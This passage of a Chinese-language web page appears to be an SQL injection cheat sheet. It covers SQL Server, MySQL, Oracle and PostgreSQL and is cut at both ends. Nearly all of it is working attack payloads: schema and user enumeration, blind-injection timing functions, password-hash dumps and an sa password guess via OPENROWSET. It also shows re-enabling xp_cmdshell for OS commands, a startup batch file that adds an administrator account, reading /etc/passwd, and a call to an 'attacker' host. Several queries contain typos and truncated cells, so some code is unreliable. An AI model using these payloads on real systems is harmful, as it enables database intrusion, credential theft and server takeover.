class="token keyword">by</span> x<span class="token punctuation">)</span>a<span class="token punctuation">)</span><span class="token comment">#</span>
<span class="token comment">#Oracle</span>
<span class="token operator">AND</span> <span class="token number">1</span><span class="token operator">=</span><span class="token punctuation">(</span>utl_inaddr<span class="token punctuation">.</span>get_host_name<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> banner <span class="token keyword">FROM</span> v$version <span class="token keyword">WHERE</span> rownum<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">-- </span>
<span class="token operator">AND</span> <span class="token number">1</span><span class="token operator">=</span>CTXSYS<span class="token punctuation">.</span>DRITHSX<span class="token punctuation">.</span>SN<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> banner <span class="token keyword">FROM</span> v$version <span class="token keyword">WHERE</span> rownum<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">-- </span>
<span class="token comment">#PostgreSQL</span>
<span class="token operator">AND</span> <span class="token number">1</span><span class="token operator">=</span>CAST<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>::<span class="token keyword">text</span> <span class="token keyword">AS</span> <span class="token keyword">NUMERIC</span><span class="token punctuation">)</span><span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ol start="3">
<li>将多行合并为单行</li>
</ol>
<p>使用SQL合并多行  </p>
<table>
<thead>
<tr>
<th>平   台</th>
<th>合并多行和（或）列的查询</th>
</tr>
</thead>
<tbody><tr>
<td>Microsoft SQL  Server</td>
<td><code>BEGIN DECLARE @x varchar (8000) SET @x=' '  SELECT @x=@x+'/'+name FROM sysobjects WHERE name&gt;'a' ORDER BY name END; SELECT @x AS DATA INTO foo</code> <br><code>-- populates the @x variable with all "name"column values from sysobjects table. Data from the @x variable is the stored in a table named foo under a column named data</code> <code>BEGIN DECLARE @x varchar(8000) SET @x=' '  SELECT @x=@x+'/'+name FROM sysobjects WHERE name&gt;'a' ORDER BY name; SELECT 1 WHERE 1 IN (SELECT @x) END;</code><br><code>-- As above but displays results with the sQL server error message</code><br> <code>SELECT name FROM sysobjects FOR XML RAW</code><br><code>-- returns the resultset as a single XML formatted string</code></td>
</tr>
<tr>
<td>Oracle</td>
<td>`SELECT sys.stragg(distinct username</td>
</tr>
<tr>
<td>MySQL</td>
<td><code>SELECT GROUP_CONCAT(user) FROM mysql.user;</code> <br><code>--Returns a comma separated list of  users.  </code></td>
</tr>
<tr>
<td>PostgreSQL</td>
<td><code>SELECT array_to_string(array(SELECT  datname FROM pg_database), ':');</code> <code>-- Returns a colon seperated list of database names </code></td>
</tr>
</tbody></table>
<h4 id="Microsoft-SQL-Server-备忘单"><a href="#Microsoft-SQL-Server-备忘单" class="headerlink" title="Microsoft SQL Server 备忘单"></a>Microsoft SQL Server 备忘单</h4><ol>
<li>枚举数据库配置信息和模式</li>
</ol>
<p>提取Microsoft SQL Server的配置信息</p>
<table>
<thead>
<tr>
<th>数   据</th>
<th>查  询</th>
</tr>
</thead>
<tbody><tr>
<td>版本</td>
<td><code>SELECT @@version;</code></td>
</tr>
<tr>
<td>当前用户</td>
<td><code>SELECT system user;</code><br><code>SELECT suser_sname();</code><br><code> SELECT user;</code><br><code> SELECT loginame FROM master..sysprocesses WHERE spid =@@SPID;</code></td>
</tr>
<tr>
<td>列出用户</td>
<td><code>SELECT name FROM master..syslogins;  </code></td>
</tr>
<tr>
<td>当前用户权限，如果用户为sysadmin，返回1;如果用户不具有sysadmin权限，返回0</td>
<td><code>SELECT is_srvolemenber('sysadmin');  </code></td>
</tr>
<tr>
<td>数据库服务器主机名</td>
<td><code>SELECT  @@ servername;</code><br><code>SELECT  SERVEROROPERTY('productversion'), SERVERPROPERTY('productlevel'),SERVERPROPERTY('edition');  -- 仅 SQL  Server 2005</code></td>
</tr>
</tbody></table>
<p>提取Microsoft SQL Server的模式信息</p>
<table>
<thead>
<tr>
<th>数   据</th>
<th>查   询</th>
</tr>
</thead>
<tbody><tr>
<td>当前数据库</td>
<td><code>SELECT DB_NAME();</code></td>
</tr>
<tr>
<td>列出数据库</td>
<td><code>SELECT name FROM master..sysdatabases;</code><br>  <code>SELECT DB NAME(N);</code><br><code>-- Where N is the database number </code></td>
</tr>
<tr>
<td>列出表</td>
<td>当前数据库中的表：<br><code>SELECT name FROM sysobjects WHERE xtype='u';</code><br><code>SELECT name FROM sysobjects WHERE xtype='V';--视图</code><br>master数据库中的表：<br><code>SELECT name FROM master..sysobjects WHERE xtype='U';</code><br><code>SELECT name FROM master..sysobjects WHERE xtype='V';</code></td>
</tr>
<tr>
<td>列出列</td>
<td>当前数据库中tblUsers表的列名：<br><code>SELECT name FROM syscolumns WHERE id=object_id('tblUsers');</code><br>admin数据库中tblUsers表的列名：<br><code>SELECT name FROM admin..syscolumns WHERE id=object_id('admin..tblmembers');</code></td>
</tr>
<tr>
<td>査找具有指定名称的列</td>
<td>查找指定的name <br><code>drop table pentest；begin declare@ret varchar(8000) set @ret=CHAR(58) select @ret=@ret+CHAR(32)+o.name+ CHAR(47)+c.name from syscolumns c,sysobjects o where c.name LIKE '%XXX%' and c.id=o.id and o.type='U' select @ret as ret into pentest end-</code><br>URL编码<br>查找名称中包含Pass的列名<br><code>drop table pentest;begin declare @ret varchar(8000) set @ret=CHAR(58) select @ret=@ret+CHAR(32)+o.name+CHAR(47)+c.name from syscolumns c,sysobjects o where (c.name LIKE'%[Pp][Aa][Ss][Ss]%' or c.name LIKE'%[Pp][Ww][Dd]%') and c.id=o.id and o.type='U' select @ret as ret into pentest end-</code><br>URL编码</td>
</tr>
<tr>
<td>在列中查找特定的值</td>
<td>对于指定的搜索字符串，返回数据库和列的名称，并将数据存储在foo数据库中<code>Drop table #Results;Drop table foo;CREATE TABLE #Results(ColumnName nvarchar(370),ColumnValue nvarchar(3630);SET NOCOUNT ON;DECLARE @TableName nvarchar(256),@columnNamenvarchar(128), @Searchstr2 nvarchar(110) SET @TableName = ''; SET @searchstr2 = QUOTENAME('%'+'dave'+'%',''''); WHILE @TableName IS NOT NULL BEGIN SET @columnName = ''; SET @TableName =(SELECT MIN (QUOTENAME(TABLE_SCHEMA) + '.' + QUOTENAME(TABLE_NAME)) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE_TABLE' AND OUOTENAME (TABLE_SCHEMA) + '.' + QUOTENAME(TABLE_NAME) &gt; @rableName AND OBJECTPROPERTY (OBJECT_ID(QUOTENAME(TABLE_SCHEMA)+ QUOTENAME(TABLE_NAME)),'IsMSShipped') = 0); WHILE (@TableName IS NOT NULL) AND (@ColumnName IS NOT NULL) BEGIN SET @ColumnName =(SELECT MIN (QUOTENAME(COLUMN_NAME)) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA PARSENAME (@TableName, 2) AND TABLE_NAME = PARSENAME(@TableName, 1) AND DATA_TYPE IN ('char', 'varchar', 'nchar','nvarchar') AND QUOTENAME (COLUMN_NAME) &gt; @columnName); IF @ColumnName IS NOT NULL BEGIN INSERT INTO #Results EXEC('SELECT '''+@rableName +'.'+@columnName+''',LEFT('+@columnName +', 3630) FROM'+ @rableName+'(NOLOCK)+'WHERE' + @columnName + 'LIKE'+@Searchstr2); END END END select ColumnName, ColumnValue into foo FROM # Results</code><br>URL编码</td>
</tr>
</tbody></table>
<ol start="2">
<li>SQL 盲注函数：Microsoft SQL Server</li>
</ol>
<p>SQL盲注函数</p>
<table>
<thead>
<tr>
<th>数   据</th>
<th>查  询</th>
</tr>
</thead>
<tbody><tr>
<td>字符串长度</td>
<td><code>LEN()  </code></td>
</tr>
<tr>
<td>从给定字符串中提取子串</td>
<td><code>SUBSTRING(string,offset,length) </code></td>
</tr>
<tr>
<td>字符串（’ABC’）不带单引号的表示方式</td>
<td><code>SELECT char(0x41) + char(0x42) + char(0x43);  </code></td>
</tr>
<tr>
<td>触发时间延迟</td>
<td><code>WAITFOR DELAY '0:0:9'; --c触发9秒的时间延迟 </code></td>
</tr>
<tr>
<td>IF语句</td>
<td><code>IF (1=1) SELECT 'A' ELSE SELECT 'B' -- 返回  </code></td>
</tr>
</tbody></table>
<ol start="3">
<li>Microsoft SQL Server 的权限提升</li>
</ol>
<p>Microsoft SQL Server 的版本号</p>
<table>
<thead>
<tr>
<th>版本号</th>
<th>服务包</th>
</tr>
</thead>
<tbody><tr>
<td>9.00.3042</td>
<td>Microsoft SQL Server 2005 SP2</td>
</tr>
<tr>
<td>9.00.2047</td>
<td>Microsoft SQL Server 2005 SP1</td>
</tr>
<tr>
<td>9.00.1399</td>
<td>Microsoft SQL Server 2005</td>
</tr>
<tr>
<td>8.00.2039</td>
<td>Microsoft SQL Server 2000 SP4</td>
</tr>
<tr>
<td>8.00.818</td>
<td>Microsoft SQL Server 2000 SP3  w/Cumulative Patch MS03-031</td>
</tr>
<tr>
<td>8.00.760</td>
<td>Microsoft SQL Server 2000 SP3</td>
</tr>
<tr>
<td>8.00.532</td>
<td>Microsoft SQL Server 2000 SP2</td>
</tr>
<tr>
<td>8.00.384</td>
<td>Microsoft SQL Server 2000 SP1</td>
</tr>
<tr>
<td>8.00.194</td>
<td>Microsoft SQL Server 2000</td>
</tr>
<tr>
<td>7.00.1063</td>
<td>Microsoft SQL Server 7.0 SP4</td>
</tr>
<tr>
<td>7.00.961</td>
<td>Microsoft SQL Server 7.0 SP3</td>
</tr>
<tr>
<td>7.00.842</td>
<td>Microsoft SQL Server 7.0 SP2</td>
</tr>
<tr>
<td>7.00.699</td>
<td>Microsoft SQL Server 7.0 SP1</td>
</tr>
<tr>
<td>7.00.623</td>
<td>Microsoft SQL Server 7.0</td>
</tr>
<tr>
<td>6.50.479</td>
<td>Microsoft SQL Server 6.5 SP5a Update</td>
</tr>
<tr>
<td>6.50.416</td>
<td>Microsoft SQL Server 6.5 SP5a</td>
</tr>
<tr>
<td>6.50.415</td>
<td>Microsoft SQL Server 6.5 SP5</td>
</tr>
<tr>
<td>6.50.281</td>
<td>Microsoft SQL Server 6.5 SP4</td>
</tr>
<tr>
<td>6.50.258</td>
<td>Microsoft SQL Server 6.5 SP3</td>
</tr>
<tr>
<td>6.50.240</td>
<td>Microsoft SQL Server 6.5 SP2</td>
</tr>
<tr>
<td>6.50.213</td>
<td>Microsoft SQL Server 6.5 SP1</td>
</tr>
<tr>
<td>6.50.201</td>
<td>Microsoft SQL Server 6.5 RTM</td>
</tr>
</tbody></table>
<ol start="4">
<li>OPENROWSET重验证攻击</li>
</ol>
<p>下列OPENROWSET查询将尝试使用口令为letmein的sa账户连接到地址为 127.0.0.1 的 SQL Server：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token keyword">OPENROWSET</span><span class="token punctuation">(</span><span class="token string">'SQLOLEDB'</span><span class="token punctuation">,</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">;</span><span class="token string">'sa'</span><span class="token punctuation">;</span><span class="token string">'letmein'</span><span class="token punctuation">,</span><span class="token string">'SET FMTONLY OFF execute master..xp_cmdshell "dir"'</span><span class="token punctuation">)</span><span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="5">
<li>攻击数据库服务器：Microsoft SQL Server</li>
</ol>
<ul>
<li>通过xp_cmdshell执行系统命令</li>
</ul>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span> master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>xp_cmdshell <span class="token string">'os command'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>重新启用xp_cmdshell</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span> sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span> <span class="token number">1</span>
<span class="token keyword">EXEC</span> sp_configure <span class="token keyword">reconfigure</span> 
<span class="token keyword">EXEC</span> sp_configure <span class="token string">'xp_cmdshell'</span><span class="token punctuation">,</span> <span class="token number">1</span>
<span class="token keyword">EXEC</span> sp configure <span class="token keyword">reconfigure</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>xp_cmdshell存储过程已经被删除了，但.dll并未删除，启用它：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span> sp_addextendedproc <span class="token string">'xp_cmdshell'</span><span class="token punctuation">,</span> <span class="token string">'xpsq170.dll'</span>
<span class="token keyword">EXEC</span> sp_addextendedproc <span class="token string">'xp_cmdshell'</span><span class="token punctuation">,</span> 'xplog70<span class="token punctuation">.</span>dll<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<ul>
<li>xp_cmdshell的替代方案</li>
</ul>
<p>作为xp_cmdshell存储过程的替代方案，可以执行下列SQL语句来实现相同的效果:</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">DECLARE</span> <span class="token variable">@altshell</span> <span class="token keyword">INT</span>
<span class="token keyword">EXEC</span> SP_OACREATE <span class="token string">'wscript.shell'</span><span class="token punctuation">,</span><span class="token variable">@altshell</span> OUTPUT
<span class="token keyword">EXEC</span> SP_OAMETHOD <span class="token variable">@altshell</span><span class="token punctuation">,</span><span class="token string">'run'</span><span class="token punctuation">,</span><span class="token string">'null'</span><span class="token punctuation">,</span><span class="token string">'%systemroot%\system32\cmd.exe /c'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>要想在Microsoft SQL Server 2005上执行这个替代的shell,首先要执行下列SQL：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span> sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span> <span class="token number">1</span>
<span class="token keyword">EXEC</span> sp_configure <span class="token keyword">reconfigure</span>
<span class="token keyword">EXEC</span> sp_configure <span class="token string">'Ole Automation Procedures'</span><span class="token punctuation">,</span> <span class="token number">1</span>
<span class="token keyword">EXEC</span> sp_configure <span class="token keyword">reconfigure</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li>破解数据库口令</li>
</ul>
<p>Microsoft SQL Server 2000的口令哈希存储在sysxlogins表中，可以使用下列SQL语句提取它们</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token keyword">user</span><span class="token punctuation">,</span>password <span class="token keyword">FROM</span> master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>sysxlogins<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>Microsoft SQL Server 2005 哈希</li>
</ul>
<p>以下SQL语句会检索sa账户的口令哈希：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> password_hash <span class="token keyword">FROM</span> sys<span class="token punctuation">.</span>sql_logins <span class="token keyword">WHERE</span> name<span class="token operator">=</span><span class="token string">'sa'</span>
<span class="token keyword">SELECT</span> name <span class="token operator">+</span> <span class="token string">'-'</span> <span class="token operator">+</span> master<span class="token punctuation">.</span>sys<span class="token punctuation">.</span>fn_varbintohexstr<span class="token punctuation">(</span>password_hash<span class="token punctuation">)</span> <span class="token keyword">from</span> master<span class="token punctuation">.</span>sys<span class="token punctuation">.</span>sql_logins<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<ul>
<li>文件读/写</li>
</ul>
<p>如果拥有INSERT和ADMINISTER BULK OPERATIONS许可，就可以读取本地文件。下列SQL语句会将本地文件c:\boot.ini读取到localfile表中：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> localfile<span class="token punctuation">(</span><span class="token keyword">data</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">8000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">BULK</span> <span class="token keyword">INSERT</span> localfile <span class="token keyword">FROM</span> <span class="token string">'c:\boot.ini'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h4 id="MySQL-备忘单"><a href="#MySQL-备忘单" class="headerlink" title="MySQL 备忘单"></a>MySQL 备忘单</h4><ol>
<li>枚举数据库配置信息和模式</li>
</ol>
<p>提取MySQL服务器的配置信息</p>
<table>
<thead>
<tr>
<th>数   据</th>
<th>查   询</th>
</tr>
</thead>
<tbody><tr>
<td>版本</td>
<td><code>SELECT @@version;</code></td>
</tr>
<tr>
<td>当前用户</td>
<td><code>SELECT user();</code><br><code>SELECT system user();</code></td>
</tr>
<tr>
<td>列出用户</td>
<td><code>SELECT user FROM mysql.user;</code></td>
</tr>
<tr>
<td>当前用户权限</td>
<td><code>SELECT grantee, privilege_type, is_grantable FROM information_schema.user privileges;</code></td>
</tr>
</tbody></table>
<p>提取MySQL 5.0及之后版本的模式信息</p>
<table>
<thead>
<tr>
<th>数   据</th>
<th>查   询</th>
</tr>
</thead>
<tbody><tr>
<td>当前数据库</td>
<td><code>SELECT database();</code></td>
</tr>
<tr>
<td>列出数据库</td>
<td><code>SELECT schema name FROM information  schema.schemata;</code></td>
</tr>
<tr>
<td>列出表</td>
<td>列出当前数据库中的表：  <br><code>UNION SELECT TABLE_NAME FROM  information_schema.tables WHERE  TABLE_SCHEMA= database();  </code><br>列出所有用户自定义数据库中的所有表： <br><code> SELECT table_schema, tabble_name FROM information_schema.tables  WHERE table_schema!= 'information_schema' AND table_schema !='mysql</code></td>
</tr>
<tr>
<td>列出列</td>
<td>列出当前数据库中tblUsers表的列名：  <br><code>SELECT column_name FROM information_schema.columns  WHERE  table_name='tblUsers'  #返回 tblUsers 表所有列的列名  </code><br>列出所有用户定义的数据库中的所有列：  <br><code>SELECT table_schema, tabble_name, column_name FROM information_schema.columns WHERE table_schema != 'information_schema' AND table schema !='mysql'</code></td>
</tr>
</tbody></table>
<ol start="2">
<li>SQL盲注函数:MySQL</li>
</ol>
<p>SQL盲注函数</p>
<table>
<thead>
<tr>
<th>数   据</th>
<th>查  询</th>
</tr>
</thead>
<tbody><tr>
<td>字符串长度</td>
<td><code>LENGTH()</code></td>
</tr>
<tr>
<td>从给定字符串中提取子串</td>
<td><code>SELECT SUBSTR(string, offset, length);</code></td>
</tr>
<tr>
<td>字符串(‘ABC’)不带单引号的表示方式</td>
<td><code>SELECT char(65,66,67);</code></td>
</tr>
<tr>
<td>触发时间延迟</td>
<td><code>BENCHMARK(1000000,MD5("HACK"));  #触发一个可度量的时间延迟 </code><br><code> SLEEP(10);  #触发一个10秒的时间延迟(MySQL 5以及更高版本)</code></td>
</tr>
<tr>
<td>IF语句</td>
<td><code>SELECT if (1=1,'A','B'); -- 返回'A'</code></td>
</tr>
</tbody></table>
<ol start="3">
<li>攻击数据库服务器：MySQL</li>
</ol>
<ul>
<li>执行系统命令</li>
</ul>
<p>可以通过在目标服务器上创建一个定期执行的恶意脚本文件来执行操作系统命令。下列语句用于从MySQL读取内容并将其写入本地文件中</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">SBLECT <span class="token string">'system_commands'</span> <span class="token keyword">INTO</span> <span class="token keyword">dumpfile</span> trojanpath<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>接下来的语句会在Windows启动目录中创建一个批处理文件，用于添加一个口令为x的管理员用户X</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token string">'net user x x /add%26%26 net localgroup administrators x /add'</span> <span class="token keyword">into</span> <span class="token keyword">dumpfile</span> <span class="token string">'c:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\attack.bat'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>破解数据库口令</li>
</ul>
<p>返回一个以冒号分隔的用户名和口令哈希值的列表</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> concat<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">,</span><span class="token string">":"</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">FROM</span> mysql<span class="token punctuation">.</span><span class="token keyword">user</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>直接攻击数据库</li>
</ul>
<p>Windows： <a target="_blank" rel="noopener" href="http://www.scoobygang.org/HiDDenWarez/mexec.pl">www.scoobygang.org/HiDDenWarez/mexec.pl</a></p>
<p>Windows： <a target="_blank" rel="noopener" href="http://www.0xdeadbeef.info/exploits/raptor_winudf.tgz">www.0xdeadbeef.info/exploits/raptor_winudf.tgz</a></p>
<p>基于 UNIX： <a target="_blank" rel="noopener" href="http://www.0xdeadbeef.infb/exploits/raptor_udf.c">www.0xdeadbeef.infb/exploits/raptor_udf.c</a></p>
<ul>
<li>读取文件</li>
</ul>
<p>查看UNIX主机上的/etc/passwd文件</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> LOAD_FILE<span class="token punctuation">(</span><span class="token string">'/etc/passwd'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>启用了 MAGIC_QUOTES_GPC,可以使用十六进制字符串代表该文件路径以避免使用单引号字符</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> LOAD_FILE<span class="token punctuation">(</span><span class="token number">0x2f6574632f706173737764</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">#加载/etc/passwd</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<ul>
<li>写入文件</li>
</ul>
<p>从mytable表中返回所有数据，并将输出写入到/tmp/hacker中</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> mytable <span class="token keyword">INTO</span> <span class="token keyword">dumpfile</span> <span class="token string">'/tmp/hacker'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="Oracle-备忘单"><a href="#Oracle-备忘单" class="headerlink" title="Oracle 备忘单"></a>Oracle 备忘单</h4><ol>
<li>枚举数据库配置信息和模式</li>
</ol>
<p>提取Oracle服务器的配置信息</p>
<table>
<thead>
<tr>
<th>数   据</th>
<th>查   询</th>
</tr>
</thead>
<tbody><tr>
<td>版本</td>
<td><code>SELECT banner FROM v$version;</code></td>
</tr>
<tr>
<td>当前用户</td>
<td><code>SELECT user FROM dual;</code></td>
</tr>
<tr>
<td>列出用户</td>
<td><code>SELECT username FROM all users ORDER BY username;</code></td>
</tr>
<tr>
<td>当前用户权限</td>
<td><code>SELECT * FROM user role_privs;</code> <br><code>SELECT * FROM user_tab_privs;</code><br> <code> SELECT * FROM user_sys_privs;</code><br> <code>SELECT sys_context('USERENV','ISDBA') FROM dual;</code><br><code>SELECT grantee FROM dba_sys_privs WHERE privilege = 'SELECT ANY DICTIONARY';</code></td>
</tr>
<tr>
<td>应用服务器主机名</td>
<td><code>SELECT sys_context('USERENV','HOST') FROM dual;</code><br><code>SELECT sys_context('USERENV','SERVER_HOST') FROM dual;</code></td>
</tr>
<tr>
<td>数据库服务器主机名</td>
<td><code>SELECT UTL_INADDR.get_host_name FROM dual</code></td>
</tr>
<tr>
<td>建立外部连接</td>
<td>`SELECT utl_http.request(‘<a target="_blank" rel="noopener" href="http://attacker:1000/">http://attacker:1000/</a>‘</td>
</tr>
<tr>
<td>引发错误</td>
<td>引发包含版本标志的错误  <br><code>AND (utl_inaddr.get_host_name((select banner from v$version where rownum=1)))=1</code></td>
</tr>
</tbody></table>
<p>提取Oracle数据库的模式信息</p>
<table>
<thead>
<tr>
<th>数   据</th>
<th>查   询</th>
</tr>
</thead>
<tbody><tr>
<td>数据库名</td>
<td><code>SELECT global_name FROM global_name;</code></td>
</tr>
<tr>
<td>列出模式/用户</td>
<td><code>SELECT username FROM all_users;</code></td>
</tr>
<tr>
<td>列出表名及其模式</td>
<td><code>SELECT ower,table_name FROM all_users;</code></td>
</tr>
<tr>
<td>列出列</td>
<td><code>SELECT ower, table_name, column_name FROM all_tab_columns WHERE table_name= 'tblUsers';</code></td>
</tr>
</tbody></table>
<p>数据库中的加密信息</p>
<table>
<thead>
<tr>
<th>数   据</th>
<th>查   询</th>
</tr>
</thead>
<tbody><tr>
<td>经过加密的表</td>
<td><code>SELECT table_name, column_name,  encryption_alg, salt FROM  dba_encrypted_columns;</code> <br> 从Oracle 10g开始，可以对表使用透明加密。考虑到性能原因，通常只对最重要的列进行加密</td>
</tr>
<tr>
<td>列出使用加密库的对象</td>
<td><code>SELECT owner, name, type, referenced_name  FROM all_dependencies;</code><br>  显示使用了数据库加密的对象(例如，DBMS_CRYPTO和DBMS_OBFUSCATION_TOOLKIT中的密码)</td>
</tr>
<tr>
<td>列出包含’crypt’字符串的PL/SQL函数</td>
<td><code>SELECT  owner,object_name,procedure_name  FROM all_procedures where  (lower(object_name) LIKE '%crypt%' or lower(procedure_name) like '%crypt%') AND object_name not in ('DBMS OBFUSCATION  TOOLKIT','DBMS_CRYPTO_TOOLKIT')</code></td>
</tr>
</tbody></table>
<ol start="2">
<li>SQL盲注函数：Oracle</li>
</ol>
<p>SQL盲注函数</p>
<table>
<thead>
<tr>
<th>数   据</th>
<th>查  询</th>
</tr>
</thead>
<tbody><tr>
<td>字符串长度</td>
<td><code>LENGTH()</code></td>
</tr>
<tr>
<td>从给定字符串中提 取子串</td>
<td><code>SELECT SUBSTR(string,offset,length) FROM dual;</code></td>
</tr>
<tr>
<td>字符串（’ABC’）不带 单引号的表示方式</td>
<td>`SELECT chr(65)</td>
</tr>
<tr>
<td>触发时间延迟</td>
<td><code>SELECT UTL_INADDR.get_host_address('nowhere999.zom') FROM dual;  -- 触发可度量的时间延迟</code></td>
</tr>
</tbody></table>
<ol start="3">
<li>攻击数据库服务器：Oracle</li>
</ol>
<p>Oracle中存在两种不同类型的注入：传统SQL注入和PL/SQL注入。在PL/SQL注入中， 可以执行整个PL/SQL块；而在传统的SQL注入中，通常则只能修改单条SQL语句。</p>
<ul>
<li>命令执行</li>
</ul>
<p>使用下列脚本实现系统命令的执行和本地文件的读/写访问:</p>
<p><a target="_blank" rel="noopener" href="http://www.0xdeadbeef.infb/exploits/raptor_oraexec.sql">www.0xdeadbeef.infb/exploits/raptor_oraexec.sql</a></p>
<p><a target="_blank" rel="noopener" href="http://www.0xdeadbeef.info/exploits/raptor_oraextproc.sql">www.0xdeadbeef.info/exploits/raptor_oraextproc.sql</a></p>
<ul>
<li>读本地文件</li>
</ul>
<p>从Oracle服务器读取本地文件</p>
<p>读本地文件：XMLType</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">create</span> <span class="token operator">or</span> <span class="token keyword">replace</span> directory GETPWDIR <span class="token keyword">as</span> <span class="token string">'C:\APP\ROOT\PRODUCT\11.1.0\
DB_1\OWB\J2EE\CONFIG'</span><span class="token punctuation">;</span>
<span class="token keyword">select</span> extractvalue<span class="token punctuation">(</span><span class="token keyword">value</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'/connection-factory/@user'</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token string">'/'</span><span class="token operator">||</span>
extractvalue<span class="token punctuation">(</span><span class="token keyword">value</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'/connection—factory/@password'</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token string">'@'</span><span class="token operator">||</span>substr
<span class="token punctuation">(</span>extractvalue<span class="token punctuation">(</span><span class="token keyword">value</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'/connection-factory/@url'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>instr<span class="token punctuation">(</span>extractvalue
<span class="token punctuation">(</span><span class="token keyword">value</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'/connection-factory/@url'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'//'')+2) conn
FROM table(
XMLSequence(
extract(
xmltype(
bfilename('</span>GETPWDIR<span class="token string">','</span><span class="token keyword">data</span><span class="token operator">-</span>sources<span class="token punctuation">.</span>xml<span class="token string">'),
nls_charset_id('</span>WE8ISO8859P1<span class="token string">')
)/
'</span><span class="token operator">/</span><span class="token keyword">data</span><span class="token operator">-</span>sources<span class="token operator">/</span>connection<span class="token operator">-</span>pool<span class="token operator">/</span>connection<span class="token operator">-</span>factory'
<span class="token punctuation">)</span>
<span class="token punctuation">)</span>
<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>读本地文件：Oracle Text</p>
